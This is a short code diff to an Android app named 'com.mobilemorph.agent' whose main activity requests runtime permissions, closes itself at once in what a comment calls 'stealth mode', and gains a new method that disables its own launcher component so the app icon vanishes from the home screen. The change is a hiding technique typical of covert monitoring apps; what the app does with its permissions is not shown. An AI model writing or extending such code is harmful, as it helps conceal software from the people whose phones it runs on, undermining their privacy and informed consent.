@@ -1,6 +1,7 @@
 package com.mobilemorph.agent;
 
 import android.app.Activity;
+import android.content.ComponentName;
 import android.os.Bundle;
 import android.content.pm.PackageManager;
 import android.os.Build;
@@ -15,6 +16,7 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         requestRuntimePermissions();
+        hideLauncherIcon();
         finish(); // close the activity immediately (stealth mode)
     }
 
@@ -27,5 +29,13 @@ public class MainActivity extends Activity {
                         REQUEST_PERMISSIONS);
             }
         }
+    }
+
+    private void hideLauncherIcon() {
+        PackageManager p = getPackageManager();
+        ComponentName componentName = new ComponentName(this, MainActivity.class);
+        p.setComponentEnabledSetting(componentName,
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP);
     }
 }
